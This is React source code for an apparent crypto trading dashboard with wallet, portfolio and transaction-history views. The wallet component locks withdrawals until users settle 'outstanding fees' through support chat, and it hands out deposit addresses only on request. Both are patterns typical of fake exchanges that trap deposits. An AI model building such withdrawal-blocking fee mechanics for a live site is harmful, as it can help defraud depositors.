// ─── WALLET ───────────────────────────────────────────────────────────────────
export function DashWallet() {
  const { user, updateUser, addTx, setPending, setModal, showAlert, showToast, getUserFeeReqs, getUserWallet } = useApp();
  const prices = usePrices();
  const [coin,    setCoin]    = useState("BTC");
  const [address, setAddress] = useState("");
  const [amount,  setAmount]  = useState("");
  const [network, setNetwork] = useState("ERC-20 (Ethereum)");

  const holdings    = user?.holdings || [];
  const wallet      = getUserWallet(user?.email);
  const pendingFees = getUserFeeReqs(user?.email);
  const feesBlocking = pendingFees.length > 0;

  const doWithdraw = useCallback(() => {
    if (feesBlocking) { showAlert("⚠️ Pay outstanding fees before withdrawing"); return; }
    const amt = Number(amount);
    if (!address.trim()) { showAlert("Enter recipient wallet address"); return; }
    if (!amt || amt <= 0) { showAlert("Enter a valid amount"); return; }
    if (amt > (user?.balance||0)) { showAlert("Insufficient balance"); return; }
    const txId = `WR${Date.now()}`;
    const qty  = +(amt/(prices[coin]?.price||1)).toFixed(8);
    setPending(prev => [{ id:txId, user:user.email, user_email:user.email, type:"Withdrawal", coin, amount:qty, usd:amt, fee:+(amt*.001).toFixed(2), submitted:new Date().toLocaleString(), network, address, status:"Pending" }, ...prev]);
    addTx(user.email, { id:txId, type:"Withdrawal", symbol:coin, amount:qty, value:amt, fee:+(amt*.001).toFixed(2), status:"Pending", date:new Date().toLocaleDateString(), notes:`To: ${address.slice(0,16)}… | ${network}` });
    showToast("✅ Withdrawal submitted! Awaiting admin approval.", "success");
    setAddress(""); setAmount("");
  }, [feesBlocking, amount, address, coin, network, prices, user, setPending, addTx, showAlert, showToast]);

  return (
    <div>
      <div style={S.hd}>Wallet</div>
      <div style={S.sub}>Manage your assets, deposit and withdraw</div>
      {feesBlocking && (
        <div style={{ background:"rgba(239,68,68,.08)", border:"1px solid rgba(239,68,68,.3)", borderRadius:12, padding:"14px 18px", marginBottom:20 }}>
          <div style={{ fontWeight:700, color:C.red, fontSize:14, marginBottom:6 }}>🔒 Withdrawals Locked</div>
          <div style={{ fontSize:13, color:C.text2 }}>You have outstanding fees. Contact support to settle them and unlock withdrawals.</div>
        </div>
      )}
      <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(280px, 1fr))", gap:16 }}>
        <div style={S.card}>
          <div style={{ fontSize:16, fontWeight:700, color:C.text, marginBottom:18 }}>Withdraw Crypto</div>
          <div style={{ marginBottom:14 }}><label style={S.label}>Asset</label><select style={S.sel} value={coin} onChange={e => setCoin(e.target.value)}>{COINS.map(c => <option key={c.sym} value={c.sym}>{c.sym}</option>)}</select></div>
          <div style={{ marginBottom:14 }}><label style={S.label}>Network</label><select style={S.sel} value={network} onChange={e => setNetwork(e.target.value)}>{["ERC-20 (Ethereum)","BEP-20 (BSC)","TRC-20 (TRON)","Native BTC","Native SOL","Polygon"].map(n => <option key={n} value={n}>{n}</option>)}</select></div>
          <div style={{ marginBottom:14 }}><label style={S.label}>Recipient Address</label><input style={S.inp} placeholder="0x… or bc1q…" value={address} onChange={e => setAddress(e.target.value)}/></div>
          <div style={{ marginBottom:18 }}><label style={S.label}>Amount (USD)</label><input style={S.inp} type="number" placeholder="0.00" value={amount} onChange={e => setAmount(e.target.value)} onKeyDown={e => e.key==="Enter" && doWithdraw()}/></div>
          <button style={{ ...btn(feesBlocking?"ghost":"success"), width:"100%", padding:"12px" }} onClick={doWithdraw}>{feesBlocking?"🔒 Pay Fees First":"Request Withdrawal →"}</button>
          <div style={{ marginTop:10, fontSize:12, color:C.text3 }}>Balance: <strong style={{ color:C.green }}>${fmt(user?.balance||0)}</strong></div>
        </div>
        <div style={S.card}>
          <div style={{ fontSize:16, fontWeight:700, color:C.text, marginBottom:18 }}>Deposit Crypto</div>
          {wallet ? (
            <>
              <div style={{ background:"rgba(34,197,94,.06)", border:"1px solid rgba(34,197,94,.2)", borderRadius:12, padding:20, marginBottom:16 }}>
                <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12 }}>
                  <CoinIcon sym={wallet.coin} size={24}/>
                  <div><div style={{ fontWeight:700, color:C.text }}>{wallet.walletName||wallet.coin+" Wallet"}</div><div style={{ fontSize:11, color:C.text3 }}>Network: {wallet.network}</div></div>
                  <span style={{ ...S.tag("green"), marginLeft:"auto" }}>Active</span>
                </div>
                <div style={{ fontFamily:"monospace", fontSize:12, color:C.text, wordBreak:"break-all", background:"rgba(255,255,255,.04)", padding:"10px 14px", borderRadius:8, border:"1px solid rgba(255,200,0,.2)" }}>{wallet.address}</div>
                {wallet.fee && <div style={{ marginTop:10, fontSize:12, color:C.gold }}>⚠️ Deposit fee: {wallet.fee}</div>}
                <button style={{ ...btn("ghost"), width:"100%", padding:"9px", fontSize:13, marginTop:12 }} onClick={() => { navigator.clipboard?.writeText(wallet.address); showToast("Address copied!","success"); }}>📋 Copy Address</button>
              </div>
              <div style={{ fontSize:12, color:C.text3, lineHeight:1.7 }}>Only send <strong>{wallet.coin}</strong> via <strong>{wallet.network}</strong>. Wrong coin or network = permanent loss.</div>
            </>
          ) : (
            <div style={{ textAlign:"center", padding:"30px 0" }}>
              <div style={{ fontSize:36, marginBottom:12 }}>🏦</div>
              <div style={{ fontSize:14, color:C.text2, marginBottom:8 }}>No deposit address assigned yet</div>
              <div style={{ fontSize:13, color:C.text3, marginBottom:16, lineHeight:1.7 }}>Contact support to receive your personal deposit wallet address.</div>
              <button style={{ ...btn("primary"), padding:"10px 24px" }} onClick={() => { if(window.Tawk_API&&window.Tawk_API.maximize){window.Tawk_API.maximize();}else{window.open('https://tawk.to/chat/6a2e5fe88b30661d42bef351/1jr2id950','_blank');} }}>💬 Request Address</button>
            </div>
          )}
        </div>
      </div>

      {/* Balances */}
      <div style={{ ...S.card, marginTop:18 }}>
        <div style={{ fontSize:16, fontWeight:700, color:C.text, marginBottom:16 }}>All Balances</div>
        <div style={{ ...S.rowsb, padding:"14px 0", borderBottom:`1px solid ${C.border2}` }}>
          <div style={S.row}><div style={{ width:32, height:32, borderRadius:"50%", background:"rgba(34,197,94,.15)", display:"flex", alignItems:"center", justifyContent:"center" }}>$</div><div><div style={{ fontWeight:700, color:C.text }}>USD Cash</div><div style={{ fontSize:11, color:C.text3 }}>Available</div></div></div>
          <div style={{ fontWeight:700, color:C.green }}>${fmt(user?.balance||0)}</div>
        </div>
        {holdings.length === 0 ? <EmptyState icon="💳" text="No crypto. Make a deposit to get started."/> : holdings.map((h,i) => {
          const c = coinInfo(h.sym), p = prices[h.sym];
          const val = h.qty * (p?.price||0), pnl = val - (h.qty*(h.avgBuy||0));
          return (
            <div key={h.sym} style={{ ...S.rowsb, padding:"14px 0", borderBottom:`1px solid ${C.border2}` }}>
              <div style={S.row}><CoinIcon sym={h.sym} size={32}/><div><div style={{ fontWeight:700, color:C.text }}>{c.name}</div><div style={{ fontSize:12, color:C.text3 }}>{fmtCrypto(h.qty)} {h.sym}</div></div></div>
              <div style={{ textAlign:"right" }}><div style={{ fontWeight:700, color:C.text }}>${fmt(val)}</div><div style={{ fontSize:11, color:pnl>=0?C.green:C.red }}>{pnl>=0?"+":""}{fmt(pnl)} P&L</div></div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── PORTFOLIO ────────────────────────────────────────────────────────────────
export function DashPortfolio() {
  const { user } = useApp();
  const prices = usePrices();
  const holdings = user?.holdings || [];
  const allocs = holdings.map(h => ({ ...h, val:h.qty*(prices[h.sym]?.price||0), cost:h.qty*(h.avgBuy||0) }));
  const totalVal  = allocs.reduce((a,b) => a+b.val, 0);
  const totalCost = allocs.reduce((a,b) => a+b.cost, 0);
  const totalPnl  = totalVal - totalCost;

  return (
    <div>
      <div style={S.hd}>Portfolio</div>
      <div style={S.sub}>Allocation, performance and P&L</div>
      <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(160px, 1fr))", gap:14, marginBottom:22 }}>
        {[
          { l:"Total Invested",  v:"$"+fmt(totalCost),  c:C.text2 },
          { l:"Current Value",   v:"$"+fmt(totalVal),   c:"#ffc800" },
          { l:"Total P&L",       v:(totalPnl>=0?"+":"")+fmt(totalPnl), c:totalPnl>=0?C.green:C.red },
          { l:"Return %",        v:(totalCost>0?(totalPnl/totalCost*100).toFixed(2):0)+"%", c:totalPnl>=0?C.green:C.red },
        ].map((s,i) => (
          <div key={i} style={{ ...S.card, textAlign:"center" }}>
            <div style={{ fontSize:10, color:C.text3, textTransform:"uppercase", letterSpacing:".06em", marginBottom:8 }}>{s.l}</div>
            <div style={{ fontSize:22, fontWeight:800, color:s.c }}>{s.v}</div>
          </div>
        ))}
      </div>
      {holdings.length === 0 ? (
        <div style={{ ...S.card, textAlign:"center", padding:"60px 20px" }}>
          <div style={{ fontSize:48, marginBottom:16, opacity:.3 }}>📊</div>
          <div style={{ fontSize:16, fontWeight:700, color:C.text, marginBottom:8 }}>Your portfolio is empty</div>
          <div style={{ fontSize:14, color:C.text3 }}>Start trading to build your portfolio</div>
        </div>
      ) : (
        <div style={{ display:"grid", gridTemplateColumns:"repeat(auto-fit, minmax(280px, 1fr))", gap:16 }}>
          <div style={S.card}>
            <div style={{ fontSize:15, fontWeight:700, color:C.text, marginBottom:16 }}>Allocation</div>
            {allocs.map(a => {
              const pct = totalVal>0?(a.val/totalVal)*100:0;
              const c = coinInfo(a.sym);
              return (
                <div key={a.sym} style={{ marginBottom:16 }}>
                  <div style={{ ...S.rowsb, marginBottom:7 }}>
                    <div style={S.row}><CoinIcon sym={a.sym} size={22}/><span style={{ fontSize:13, fontWeight:700, color:C.text }}>{a.sym}</span><span style={{ fontSize:11, color:C.text3 }}>{fmtCrypto(a.qty)}</span></div>
                    <span style={{ fontSize:13, fontWeight:700, color:C.text }}>{pct.toFixed(1)}% · ${fmt(a.val)}</span>
                  </div>
                  <div style={{ height:8, background:"rgba(255,200,0,.1)", borderRadius:4, overflow:"hidden" }}>
                    <div style={{ height:"100%", width:pct+"%", background:`linear-gradient(90deg,${c.color}80,${c.color})`, borderRadius:4, transition:"width .5s" }}/>
                  </div>
                </div>
              );
            })}
          </div>
          <div style={S.card}>
            <div style={{ fontSize:15, fontWeight:700, color:C.text, marginBottom:16 }}>Holdings Detail</div>
            <table style={S.tbl}>
              <thead><tr>{["Asset","Qty","Avg Buy","Price","Value","P&L"].map(h=><th key={h} style={S.th}>{h}</th>)}</tr></thead>
              <tbody>
                {allocs.map(a => {
                  const p = prices[a.sym], pnl = a.val-a.cost, pct = a.cost>0?(pnl/a.cost*100).toFixed(1):0;
                  return (
                    <tr key={a.sym}>
                      <td style={S.td}><div style={S.row}><CoinIcon sym={a.sym} size={20}/><span style={{ fontWeight:700, color:C.text }}>{a.sym}</span></div></td>
                      <td style={{ ...S.td, fontFamily:"monospace" }}>{fmtCrypto(a.qty)}</td>
                      <td style={{ ...S.td, fontFamily:"monospace" }}>${fmt(a.avgBuy||0)}</td>
                      <td style={{ ...S.td, fontFamily:"monospace" }}>${p?.price<1?p?.price.toFixed(4):fmt(p?.price)}</td>
                      <td style={{ ...S.td, fontFamily:"monospace", fontWeight:700 }}>${fmt(a.val)}</td>
                      <td style={S.td}><span style={{ color:pnl>=0?C.green:C.red, fontWeight:600 }}>{pnl>=0?"+":""}{fmt(pnl)} ({pct}%)</span></td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── HISTORY ──────────────────────────────────────────────────────────────────
export function DashHistory() {
  const { user, getTxs } = useApp();
  const [filter, setFilter] = useState("All");
  const allTxs = getTxs(user?.email);
  const types = ["All","Buy","Sell","Deposit","Withdrawal","Fee Payment"];
  const filtered = filter==="All" ? allTxs : allTxs.filter(t=>t.type===filter);

  return (
    <div>
      <div style={S.hd}>Transaction History</div>
      <div style={S.sub}>Complete record of all your activity</div>
      <div style={{ display:"flex", gap:6, marginBottom:18, flexWrap:"wrap" }}>
        {types.map(t => <button key={t} style={{ ...btn(filter===t?"primary":"ghost"), padding:"6px 14px", fontSize:12 }} onClick={() => setFilter(t)}>{t}</button>)}
      </div>
      <div style={S.card}>
        {filtered.length === 0 ? <EmptyState icon="📋" text={`No ${filter==="All"?"":filter+" "}transactions yet.`}/> : (
          <div style={{ overflowX:"auto", WebkitOverflowScrolling:"touch" }}>
            <table style={S.tbl}>
              <thead><tr>{["TX ID","Type","Asset","Amount","Value","Fee","Status","Date"].map(h=><th key={h} style={S.th}>{h}</th>)}</tr></thead>
              <tbody>
                {filtered.map(tx => (
                  <tr key={tx.id}>
                    <td style={{ ...S.td, fontFamily:"monospace", color:C.text3, fontSize:11 }}>{tx.id}</td>
                    <td style={S.td}><Tag c={tx.type==="Buy"?"purple":tx.type==="Sell"?"yellow":tx.type==="Deposit"?"green":"red"}>{tx.type}</Tag></td>
                    <td style={S.td}><div style={S.row}><CoinIcon sym={tx.symbol} size={18}/><span style={{ fontWeight:700 }}>{tx.symbol}</span></div></td>
                    <td style={{ ...S.td, fontFamily:"monospace" }}>{fmtCrypto(tx.amount)}</td>
                    <td style={{ ...S.td, fontFamily:"monospace", fontWeight:700 }}>${fmt(tx.value)}</td>
                    <td style={{ ...S.td, fontFamily:"monospace", color:C.gold }}>${fmt(tx.fee)}</td>
                    <td style={S.td}><Tag c={tx.status==="Completed"?"green":tx.status==="Pending"?"yellow":"red"}>{tx.status}</Tag></td>
                    <td style={{ ...S.td, color:C.text3 }}>{tx.date}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
